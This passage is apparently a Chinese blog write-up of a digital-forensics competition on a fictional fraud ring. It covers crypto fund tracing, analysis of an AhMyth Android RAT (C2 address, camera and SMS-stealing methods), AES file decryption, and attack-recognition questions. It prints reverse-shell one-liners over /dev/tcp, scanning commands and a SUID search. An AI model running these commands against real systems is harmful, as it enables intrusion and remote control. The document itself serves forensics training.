src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829785.png"></p><p>或者去比特币浏览器里查找也是可以的</p><p>注意：交易记录和链上的实际交易记录不符</p><p><code>B</code></p><ul><li>[单选题]参考Alice_Mobile.bin,Alice 总共使用了多少个虚拟货币地址直接接收受害人的IDFC? (2分)</li></ul><blockquote><p>A. 1</p><p>B. 3</p><p>C. 6</p><p>D. 7</p></blockquote><p>从客服群里搜<code>0x</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829786.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829787.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829788.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829789.png"></p><ul><li>[多选题]參考David_Laptop.e01內找到的IDFC交易记录,在收取受害人的IDFC后,它之后会再流向哪些虚拟货币地址? (2分)</li></ul><blockquote><p>A. 0xb2e3dbea311511ec5bda3e85e061f15366f888a6</p><p>B. 0x70544880875fe907cee383873ca58da23378caa5</p><p>C. 0x152c90200be61a540875f2a752c328bd19dbfb87</p><p>D. 0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829790.png"></p><p>做个图一目了然，地址为了好记只取前两位</p><p>对于b2节点，我们从时间上可以发现，10节点的代币是筹集资金的时候传进去的，和诈骗无关</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829791.png"></p><p>且在Alice手机的聊天记录中有三个收钱账户存在，和上图交易记录对应</p><p>显然是BCD</p><ul><li>[单选题]承上题,上述IDFC去到那些地址后,谁掌管这些IDFC? (提示:分析IDFC的交易记录及个人赛所搜集的证据) (2分)</li></ul><blockquote><p>A. Alice (回復種子：pumpkin fold behind captain shoulder demand print hospital like smoke gate weird)</p><p>B. Ben (回復種子：wrap muscle rhythm stamp bundle zebra gorilla shuffle common tattoo ginger awake)</p><p>C. John (回復種子：abandon among anxiety pizza evidence face quiz ripple nerve pact nasty unveil)</p><p>D. David (回復種子：stock avocado grab clay light sadness segment ancient toe talk elder oil)</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829792.png"></p><p>D</p><ul><li>[单选题]2024年9月,Tom Victor带同其秘书Amy来到警署报案,称其秘书被骗子用人工智能视频在2024年8月29日早上骗去10,000,000 IDFC,请找出该交易的交易哈希(Transaction Hash) ? (2分)</li></ul><blockquote><p>A. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a483dd92d</p><p>B. :0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792a</p><p>C. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d</p><p>D. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792c</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829793.png"></p><p>最后一条转账记录的交易hash</p><p>这里我发现所有的资金都是从72节点起步的，可能出题的时候不想弄得太过复杂，仿的有漏洞，因此这个交易记录看看就好</p><p>0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d</p><ul><li>[多选题]就現時搜集到的證據、David_Laptop_64GB.e01内的资料及IDFC的资金流分析，下列哪些虚擬货币地址是最終诈骗集团儲存犯罪所得的地址? (3分)</li></ul><blockquote><p>A. 0x63a8ba1df0404ee41f7c6af8efd2f54006f32042</p><p>B. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6</p><p>C. 0x10a4f01b80203591ccee76081a4489ae1cd1281c</p><p>D. 0x90f73497e4446f6cf9881213c32d6af66d799fe5</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829794.png"></p><p>综合分析，63，90为犯罪所得</p><h2 id="APK部分"><a href="#APK部分" class="headerlink" title="APK部分"></a>APK部分</h2><p><del>太好了，是只有java层的ezre，我们有救了(bushi)</del></p><ul><li>[单选题]你现在查看Ben的笔记本电脑,并发现了 APK 文件｡ 一般而言,APK 的关键组成部分是什么? (3分)</li></ul><blockquote><p>A. AndroidManifest.xml, classes.dex, resources.arsc, res&#x2F;</p><p>B. AndroidManifest.xml, META-INF&#x2F;, res&#x2F;, assets&#x2F;</p><p>C. classes.dex, lib&#x2F;, AndroidManifest.xml, META-INF&#x2F;</p><p>D. res&#x2F;, assets&#x2F;, AndroidManifest.xml, classes.dex</p></blockquote><p><code>A</code></p><p>基础知识</p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, 这个 APK 没有 classes.dex 文件,而是有 smali 文件,以下哪一个陈述是正确的? (3分)</li></ul><blockquote><p>A. 这是一个經過反向工程製作的 APK</p><p>B. 该 APK 已损坏</p><p>C. 文件结构不完整</p><p>D. APK 包含加密代码</p></blockquote><p><code>A</code></p><p>smali文件是 Android Dalvik 字节码的汇编代码，它们是由classes.dex反编译得到的</p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, Ben 使用了哪个工具包生成恶意APK 以控制受害者的设备? (1分)</li></ul><blockquote><p>A. Metasploit</p><p>B. SpyNote</p><p>C. QuasarRAT</p><p>D. AhMyth</p></blockquote><p><code>D</code></p><p>jdax反编译之后全局搜索，只有AhMyth</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829795.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk,确认哪个 .xml 文件被特别添加为主活动(activity_main)的布局文件? (3分)</li></ul><blockquote><p>A. activity_main.xml</p><p>B. main_activity.xml</p><p>C. main.xml</p><p>D. Thisismain.xml</p></blockquote><p><code>D</code></p><p><code>MainActivity</code>类的<code>onCreate</code>方法设置了布局文件，通过<code>setContentView(R.layout.Thisismain)</code>方法调用来指定的，表明<code>Thisismain</code>是一个布局文件的资源ID</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829796.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, 确认被指定为主活动层(activity main layer) .xml 文件的公共 ID? (3分)</li></ul><blockquote><p>A. 0x7f040000</p><p>B. 0x7f050000</p><p>C. 0x7f060000</p><p>D. 0x7f070000</p></blockquote><p>承上题，全局搜索<code>thisismain</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829797.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk,确认应用程序没有要求的权限? (3分)</li></ul><blockquote><p>A. android.permission.READ_CONTACTS</p><p>B. android.permission.USE_FINGERPRINT</p><p>C. android.permission.WRITE_CALENDAR</p><p>D. android.permission.ACCESS_FINE_LOCATION</p></blockquote><p>一开的思路是直接去搜，但是BC选项都不吻合。</p><p>其中C选项相关在apk中只找到了<code>android.permission.READ_CALENDAR</code></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk,ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的 b.smali 文件的主要功能是什么? (3分)</li></ul><blockquote><p>A. 管理网络连接</p><p>B. 处理相机操作并捕捉图像</p><p>C. 管理应用程序设置</p><p>D. 处理数据库操作</p></blockquote><p><code>B</code></p><p>跳转到<code>b.smali</code>，满篇都是camera</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829798.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk,在 ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的 b.smali 文件中,字节数组(Byte Array)在发送到服务器之前执行了哪一系列操作,最终的图像格式是? (3分)</li></ul><blockquote><p>A. 字节数组被译码、加密、转换为 PNG 格式,并发送到服务器</p><p>B. 字节数组被译码、压缩成 JPEG 格式,并封装到 JSONObject 中再发送到服务器</p><p>C. 字节数组被编码为 String,压缩成 BMP 格式,转换为字节数组并发送</p><p>D. 字节数组被编码为 String,压缩成 JPEG 格式,转换为字节数组并发送</p></blockquote><p><code>B</code></p><p>相关代码在<code>e</code>方法里面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829799.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, 在 ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的b.smali文件中,图像在发送到服务器時的压缩比率是多少? (6分)</li></ul><blockquote><p>A. 50%</p><p>B. 30%</p><p>C. 20%</p><p>D. 10%</p></blockquote><p>同上题图</p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk,在 ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的 ConnectionManager.smali 中,sendReq method 的目的是什么? (6分)</li></ul><blockquote><p>A. C2 服务器向受感染的设备发送请求</p><p>B. 处理用户接口的更新</p><p>C. 建立到 C2 服务器的网络连接</p><p>D. 管理应用程序设置</p></blockquote><p><code>C</code></p><p><code>sendReq</code> 方法获取一个 <code>b.a.b.e</code> 类型的对象，并注册了两个事件处理器：</p><ul><li><p>处理 “ping” 事件的 <code>b</code> 类实例</p></li><li><p>处理 “order” 事件的 <code>c</code> 类实例</p></li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829800.png"></p><ul><li>[单选题]承上题,参考Ben_Laptop.zip内的Joshe Investment.apk,C2服务器的 IP 地址及端口号? (6分)</li></ul><blockquote><p>A. IP:192.168.1.1:8080</p><p>B. IP:10.0.0.1:80</p><p>C. IP:172.16.0.1:443</p><p>D. IP:59.152.211.11:4444</p></blockquote><p><code>D</code></p><p>首先排除法：</p><p>ABC属于三个常见的私有IP地址范围内，这三个地址被保留用于局域网中的私有网络，不会在互联网中路由，排除就可以直接得到答案</p><p>其次静态分析：</p><p>结合上一问<code>sendReq</code> 方法中获取了 <code>b.a.b.e</code> 类型的对象，很可能是一个网络连接对象</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829801.png"></p><p>跟进到e类发现了一段base64解码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829802.png"></p><p>解码可得</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829804.png"></p><p>最后是尝试抓包，使用沙箱研判也可以得到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829805.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的 g.smali 文件中,MediaRecorder 被初始化用于录音｡如果 setAudioSource() 方法使用了错误的参数,会发生什么,且这将如何影响录音过程的功能? (6分)</li></ul><blockquote><p>A. 应用将以默认设置继续录音,但音质可能会降低</p><p>B. MediaRecorder 会抛出 IllegalStateException,并阻止录音的开始</p><p>C. 录音将继续,但文件格式将与指定的输出格式不兼容</p><p>D. 应用只会在调用 start() 方法后由于无效的音频编码而崩溃</p></blockquote><p><code>B</code></p><p><code>setAudioSource()</code> 方法用于设置音频源，该方法需要传递一个有效的音频源常量。</p><p>如果 <code>setAudioSource()</code> 传入了错误的参数，<code>MediaRecorder</code> 将无法正确初始化，通常会导致抛出一个异常。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829806.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的 g.smali 文件中,TimerTask 用于在启动 MediaRecorder 后调度动作｡TimerTask 在这个过程中有什么作用? (6分)</li></ul><blockquote><p>A. 它以设定的间隔暂停录音,以更好地管理资源</p><p>B. 它通过在设定的间隔调整录音参数来提高音质</p><p>C. 它定期压缩录制的音讯文件以节省存储空间</p><p>D. 它监控录音时长,并根据录音时间安排事件</p></blockquote><p><code>D</code></p><p><code>TimerTask</code> 的具体实现类是 <code>g.a</code>，用于在定时任务触发时执行一些清理操作。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829807.png"></p><p>当 <code>TimerTask</code> 的定时任务触发时会停止并释放 <code>MediaRecorder</code>，然后处理录制的文件。</p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, 在 ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的 h.smali 文件中,method a() 和method b() 的主要功能有什么区别? (6分)</li></ul><blockquote><p>A. Method a() 是检索存储在设备上的联系人清单并将其格式化为 JSONArray,而 method b() 是从被入侵的设备向联系人发送消息</p><p>B. Method a() 是收集收件箱中的所有 SMS 短信,而 method b() 是利用被入侵的设备发送 SMS 短信</p><p>C. Method a() 是向指定的电话号码发送包含自定义消息内容的 SMS 短信,method b() 是接收发送确认</p><p>D. Method a() 是从设备中检索 MMS 短信,而 method b() 是使用被入侵的设备发送 MMS 短信</p></blockquote><p><code>B</code></p><p>首先<strong>Method <code>a()</code>：</strong></p><p>通过 <code>ContentResolver</code> 访问设备的短信收件箱 (<code>content://sms/inbox</code>)并使用 <code>Cursor</code> 查询短信记录。</p><p>使用 <code>while (query.moveToNext())</code> 遍历查询结果。对于每条短信记录，提取发件人号码 (<code>address</code>) 和短信内容 (<code>body</code>)。</p><p>其次<strong>Method <code>b(String str, String str2)</code></strong>:</p><p>使用 <code>SmsManager</code> 的 <code>sendTextMessage</code> 方法发送短信</p><p>总之就是一个收一个发</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829808.png"></p><ul><li>[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk, 在 ahmyth&#x2F;mine&#x2F;king&#x2F;ahmyth&#x2F; 文件夹下的 h.smali 文件中,method b() 需要哪些参数? (6分)</li></ul><blockquote><p>A. method b() 请求两个字符串参数, 联系人姓名和联系人号码</p><p>B. method b() 请求一个文件路径的字符串参数和一个数据内容的字符串参数</p><p>C. method b() 请求一个 URL 的字符串参数和一个负载数据的字符串参数</p><p>D. method b() 请求两个字符串参数, 接收者的电话号码和消息内容</p></blockquote><p><code>D</code></p><p>考的基础知识</p><p>smsManager.sendTextMessage(destinationAddress, scAddress, text, sentIntent, deliveryIntent) &amp;#x20;</p><ul><li><p>destinationAddress: 收件人号码&amp;#x20;</p></li><li><p>scAddress: 短信中心服务号码, 这里设置为null&amp;#x20;</p></li><li><p>text: 发送内容</p></li><li><p>sentIntent: 发送短信结果状态信号(是否成功发送),new 一个Intent , 操作系统接收到信号后将广播这个Intent.此过程为异步.</p></li><li><p>deliveryIntent: 对方接收状态信号(是否已成功接收).</p></li></ul><h2 id="加密脚本部分"><a href="#加密脚本部分" class="headerlink" title="加密脚本部分"></a>加密脚本部分</h2><ul><li>[单选题]在分析Ben的笔记本电脑时,你从调查人员那里获得了以下信息：在对一名被捕的犯罪集团成员进行审问时获得的情报显示,Ben对John心怀怨恨,因为John扣留了Ben的犯罪收益份额｡因此,Ben加密了John的机密文件夹,以限制他的访问｡ 参考Ben_Laptop.zip,解密secretExcel.encrypted的第一步应该是什么? (2分)</li></ul><blockquote><p>A. 生成新的随机密钥</p><p>B. 打开加密文件并读取文件的前 16 个字节</p><p>C. 压缩加密档</p><p>D. 删除加密档</p></blockquote><pre><code class="python">B</code></pre><p>首先要找一下题目说的secretExcel.encrypted文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829809.png"></p><p>在桌面的Personal Data文件夹中 找三个一个是题目提到的被加密的文件 一个是加密脚本 一个是密钥文件</p><p>先看一下加密脚本&amp;#x20;</p><pre><code class="python">import osimport sysfrom Crypto.Cipher import AESfrom Crypto.Protocol.KDF import PBKDF2from Crypto.Random import get_random_bytesfrom Crypto.Util.Padding import paddef encrypt_file(file_path, password):    salt = get_random_bytes(32)        key = PBKDF2(password, salt, dkLen=32, count=100000000)    file_path = os.path.abspath(file_path)        output_dir = os.path.dirname(file_path)    folder_name = os.path.splitext(os.path.basename(file_path))[0]    encrypted_path = os.path.join(output_dir, f&quot;&#123;folder_name&#125;.encrypted&quot;)        os.makedirs(os.path.dirname(encrypted_path), exist_ok=True)        with open(file_path, &#39;rb&#39;) as f_in, open(encrypted_path, &#39;wb&#39;) as f_out:        data = f_in.read()        cipher = AES.new(key, AES.MODE_CBC)                f_out.write(cipher.iv)        f_out.write(salt)                encrypted_data = cipher.encrypt(pad(data, AES.block_size))        f_out.write(encrypted_data)        print(f&quot;File encrypted successfully: &#123;encrypted_path&#125;&quot;)if __name__ == &quot;__main__&quot;:    if len(sys.argv) != 3:        print(&quot;Usage: python encrypt.py &lt;file_path&gt; &lt;password&gt;&quot;)        sys.exit(1)    file_path = sys.argv[1]    password = sys.argv[2]        encrypt_file(file_path, password)</code></pre><p>关键的解密步骤在于这里</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829810.png"></p><p>随机生成的16字节iv被放在了加密文件的前16字节 随机生成的32字节盐值放在了后面的32字节也就是加密文件的(17-48字节) 后面是读取源文件的内容 使用iv和盐值进行加密。因此解密的第一步应该是打开加密文件并读取文件的前 16 个字节</p><ul><li>[单选题]参考Ben_Laptop.zip,在加密文件secretExcel.encrypted中,初始向量 (Initial Vector) 的值是什么? (2分)</li></ul><blockquote><p>A. 64f4e21c1e4cc3a60137da79e75bf973</p><p>B. a6b7e84f91827c3d2a94bfed7b5ca9d1</p><p>C. 3b29d2a46aab93bba07c6893d1b8e93a</p><p>D. 7f8d9b2a14c5aef3786d12c4b6e2d4f9</p></blockquote><pre><code class="python">A</code></pre><p>使用010打开加密文件 前16字节就是iv</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829811.png"></p><ul><li>[单选题]参考Ben_Laptop.zip,在加密文件secretExcel.encrypted中,盐值 (SALT) 是什么? (2分)</li></ul><blockquote><p>A. 5d5ca840accf95169288de5bf85dacd7bb05ad888afac26efd05cc436c4a5424</p><p>B. a3d9f0e4b7c8d5a9c2e7f0b3a5d7c6b1b8e7a2f9c3d1e4f5a6b9c0d7e1f2b4c8</p><p>C. f2e1d0c9b8a7f6e5d4c3b2a1e8f7d6c5b4a3d2f1e0c9b8a7d6e5c4b3a2f1e0d9</p><p>D. c7b6a5d4e3f2d1c0e9d8b7a6f5e4d3c2b1a0e9f8d7c6b5a4b3c2d1e0f9e8d7c6</p></blockquote><pre><code class="python">A</code></pre><p>按照第42题分析 第17-第48字节是盐值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829812.png"></p><ul><li>[单选题]参考Ben_Laptop.zip,查看 ‘encrypt.py’代码,如果更改’PBKDF2’ 的 ‘count’ 参数会产生什么影响? (2分)</li></ul><blockquote><p>A. 仅影响解密时所需的计算性能</p><p>B. 仅影响加密的安全性</p><p>C. 同时影响所需的计算性能和安全性</p><p>D. 没有影响</p></blockquote><pre><code class="python">C</code></pre><p>PBKDF2函数被用来从密码和盐生成加密密钥。PBKDF2 函数的count参数指定了迭代次数，表示进行密码派生时对哈希函数的迭代次数，因此增加count参数的值会导致进行更多次数的哈希迭代，增加所需的计算机性能，同时增加迭代次数可以有效增加爆破的难度，提高加密的安全性。</p><ul><li>[单选题]参考Ben_Laptop.zip,根据分析及计算后,解密secrectExcel.encrypted所用的key具体值是什么? (3分)</li></ul><blockquote><p>A:b’\xb2T\xc2\xb9\xb7wf9\x95Y\xcc)\xec\xff\x0e\xb6\xf6\x03\x92z\xc6\xe4\x11P\x07@\x94\xbcl\xfd\x95\xc5’;<br>B:b’&#x2F;T_\r\x1e\xb8\xe6_\xcd\x01\x95\xde\xb8\r\xb3\xb6\\nVp\xeb\xf1S\xb4m\xd6wH\xc4\xc8\xcf\xed’;<br>C:b’\xea\x15\xf9\x05\x85\xe8h\x87\xc4\xf0O\x8a\xba1\x96\x05b\xf9\xa3g\xbaMm\xa4\t,\xe0Q\x87\x8e\xfb\x8c’;<br>D:b’q!\xae2\x1fvo\xb6]\xfb\x1f\x8c\xe5\x18\x03\x0b\xcc\xc93\xf7&#x2F;us\x8a\x1e;\xd2\xe3\x81\x05\xaa\x04’</p></blockquote><pre><code class="python">D</code></pre><p>这一行就是生成密钥的代码</p><pre><code class="python">key = PBKDF2(password, salt, dkLen=32, count=100000000)</code></pre><p>password在同文件夹下的password.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829813.png"></p><pre><code class="python">from Crypto.Protocol.KDF import PBKDF2password = &quot;iwillnottellyouthepassworduntiligetthemoney&quot;salt = &quot;5d5ca840accf95169288de5bf85dacd7bb05ad888afac26efd05cc436c4a5424&quot;salt = bytes.fromhex(salt)key = PBKDF2(password, salt, dkLen=32, count=100000000)print(key)</code></pre><p>生成的时候需要将salt从16进制转为字节 得到原始密钥为</p><pre><code class="python">b&#39;q!\xae2\x1fvo\xb6]\xfb\x1f\x8c\xe5\x18\x03\x0b\xcc\xc93\xf7/us\x8a\x1e;\xd2\xe3\x81\x05\xaa\x04&#39;</code></pre><ul><li>[单选题]参考Ben_Laptop.zip,解密后的 Excel 文件中,程琳的电话号码是什么? (3分)</li></ul><blockquote><p>A. +852 106523728123</p><p>B. +852 180300901529</p><p>C. +60 243428690343</p><p>D. +63 060940949159</p></blockquote><pre><code class="python">A</code></pre><p>写解密脚本解密加密的excel文件</p><pre><code class="python">import osfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpaddef decrypt_file(file_path, key):    with open(file_path, &#39;rb&#39;) as f_in:        iv = f_in.read(16)          salt = f_in.read(32)         encrypted_data = f_in.read()      cipher = AES.new(key, AES.MODE_CBC, iv)    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)    output_dir = os.path.dirname(file_path)    folder_name = os.path.splitext(os.path.basename(file_path))[0]    decrypted_path = os.path.join(output_dir, f&quot;&#123;folder_name&#125;_decrypted.xlsx&quot;)    with open(decrypted_path, &#39;wb&#39;) as f_out:        f_out.write(decrypted_data)        print(f&quot;File decrypted successfully: &#123;decrypted_path&#125;&quot;)if __name__ == &quot;__main__&quot;:    encrypted_file_path = &#39;secretExcel.encrypted&#39;      key = b&#39;q!\xae2\x1fvo\xb6]\xfb\x1f\x8c\xe5\x18\x03\x0b\xcc\xc93\xf7/us\x8a\x1e;\xd2\xe3\x81\x05\xaa\x04&#39;    decrypt_file(encrypted_file_path, key)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829814.png"></p><ul><li>[填空题]参考Ben_Laptop.zip,解密后的 Excel 文件中,周亮的ID&#x2F;Passport Number是什么? (提示：只需使用阿拉伯数字回答) (3分)</li></ul><pre><code class="python">510800196504216464</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829815.png"></p><h2 id="网络安全知识部分"><a href="#网络安全知识部分" class="headerlink" title="网络安全知识部分"></a>网络安全知识部分</h2><ul><li>[单选题]根据可能难以破解的加密,你意识到Ben对黑客技术有深入的了解｡请回答以下问题,以便了解Ben的运作｡ Ben想要有效地搜索信息｡他可以使用以下哪个Google高级搜索运算符来搜索某个特定网站? (2分)</li></ul><blockquote><p>A. [related:]</p><p>B. [inurl:]</p><p>C. [site:]</p><p>D. [info:]</p></blockquote><pre><code class="python">C</code></pre><ul><li>[单选题]参考材料1.pdf,Ben试图入侵一个系统,他尝试在系统中打开HTTP服务器｡ 使用Python内置的http.server模块启动基本HTTP服务器的命令是什么,以便攻击者从目标机器下载文件? (1分)</li></ul><blockquote><p>A. python3 -m http.server9000</p><p>B. python3 -a http.server9000</p><p>C. python3 -r http.server9000</p><p>D. python3 -m http.server8000</p></blockquote><pre><code class="python">A</code></pre><p>查看1.pdf 看到端口是9000</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829816.png"></p><ul><li>[单选题]参考材料2.pdf,Ben准备了几个用于黑客攻击的脚本,这段代码的攻击目的是什么? (4分)</li></ul><blockquote><p>A. 拒绝服务</p><p>B. 缓冲区溢出</p><p>C. 建立反向 shell</p><p>D. 勒索软件</p></blockquote><pre><code class="python">B</code></pre><p>看到&amp;#x20;</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829817.png"></p><p>需要268字节来填充缓冲区 判断为缓冲区溢出</p><ul><li>[单选题]Ben准备了几个用于黑客攻击的脚本｡参考材料3.pdf,他采用了什么技术来保护代码? (2分)</li></ul><blockquote><p>A. 加密</p><p>B. 代码混淆</p><p>C. 隐写术</p><p>D. 编译</p></blockquote><pre><code class="python">B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829818.png"></p><p>一眼php混淆</p><ul><li>[单选题]参考材料4.pdf,他利用了什么方法来获取反弹shell(Reverse shell)? (2分)</li></ul><blockquote><p>A. 中间人攻击</p><p>B. 暴力破解</p><p>C. 缓冲区溢出</p><p>D. 文件上传</p></blockquote><pre><code class="python">D</code></pre><p>看到url里面的uploads路径 判断为文件上传来反弹shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829819.png"></p><ul><li>[单选题]参考1.pcap,Ben使用了哪些命令来扫描目标机器（提示:Ubuntu）? i) arp-scan -l ii) nmap -p1-65535 -sV -sC -O iii) nmap -Sx iv) nmap -sS (4分)</li></ul><blockquote><p>A. i&amp;ii</p><p>B. ii&amp;iii</p><p>C. iii&amp;iv</p><p>D. 以上皆是</p></blockquote><pre><code class="python">A</code></pre><p>首先第三个是无效命令 所以BCD都不选 选A 在来看一下第二个的意思</p><pre><code class="python">扫描目标主机的所有端口（1-65535）。尝试识别每个开放端口上运行的服务及其版本。执行默认的安全脚本以发现潜在问题。尝试识别目标主机的操作系统类型和版本</code></pre><p>同时也在流量包1中找到大量arp的包 所以可能使用了命令1来扫描目标机器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829820.png"></p><ul><li>[单选题]参考2.pcap,第56号数据包的代码功能是什么? (4分)</li></ul><blockquote><p>A.&amp;#x20;</p><p>清除记录</p><p>B.&amp;#x20;</p><p>拒绝服务</p><p>C.&amp;#x20;</p><p>测试注入漏洞</p><p>D.&amp;#x20;</p><p>反向外殼 (Reverse Shell)</p></blockquote><pre><code class="python">D</code></pre><p>在流量包2中看一下第56个包 追踪tcp流 在User-Agent中看到一个反弹shell的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829821.png"></p><ul><li>[填空题]参考1.pcap,当Ben成功进入目标系统时,攻击者获取的账户? (答案格式:请使用小写英文字母作答) (4分)</li></ul><pre><code class="python">root</code></pre><p>直接在流量包1中追踪tcp流 翻到最后一个包 找到了攻击者成功拿到shell之后执行命令的内容</p><p>看到此时的用户是root</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829822.png"></p><ul><li>[单选题]Ben正在尝试入侵一个系统,并且他正在进行开源研究,他发现 nc -lvp 9000 将被用来连接到反弹shell (Reverse Shell),Ben将使用什么命令来创建反弹shell (Reverse Shell)?&amp;#x20;</li></ul><p>i) 0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.10&#x2F;9000;sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&amp;#x20;</p><p>ii) exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.10&#x2F;9000;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&amp;#x20;</p><p>iii) &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.217.139&#x2F;4444 0&gt;&amp;1&amp;#x20;</p><p>iv) sh -i 5&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.10&#x2F;9000 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5 (4分)</p><blockquote><p>A. i</p><p>B. ii</p><p>C. iii</p><p>D. iv</p></blockquote><pre><code class="python">D</code></pre><ul><li>[填空题]参考材料5.pdf,Ben输入了“find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null”后,显示了材料5.pdf的內容,這些內容所显示的内容除具有执行权限,还设置了什么? (答案格式:请以大写英文字母作答输入答案) (4分)</li></ul><pre><code class="python">SUID</code></pre><p>这条命令就是用来查看有suid特殊权限的文件的</p><ul><li>[单选题]Ben发现了下面的命令import pty; pty.spawn(“&#x2F;bin&#x2F;bash”),它的功能是? (4分)</li></ul><blockquote><p>A. 在 shell 中导入 Python 函数</p><p>B. 允许 shell 执行 Python 命令</p><p>C. 获取比 www-data 用户更高权限的交互式 shell</p><p>D. 以上皆不是</p></blockquote><pre><code class="python">D</code></pre><p>就是创建一个当前用户下的可交互的shell 不能提升权限&amp;#x20;</p><h2 id="Ben的笔记本部分"><a href="#Ben的笔记本部分" class="headerlink" title="Ben的笔记本部分"></a>Ben的笔记本部分</h2><ul><li>[填空题]你注意到Ben的笔记本电脑上安装了暗网 Tor,请回答以下问题。 Ben应该输入什么命令来在 Kali Linux 中执行 Tor 浏览器? (答案格式:小写英文字母和符号’-‘混合作答,例如:abc-def) (4分)</li></ul><pre><code class="python">tor-browser</code></pre><ul><li>[单选题]</li></ul><p>参考Ben_Laptop.zip,Ben经常使用 Tor 浏览器,该 Tor 浏览器把多少个 .onion 链接添加为书签? (2分)</p><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p></blockquote><pre><code class="python">D</code></pre><p>比较迷惑的一道题 从取证软件和我进行仿真查看书签记录的结果来看 明显是超过四个 只能选择最多的了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829823.png"></p><p><img 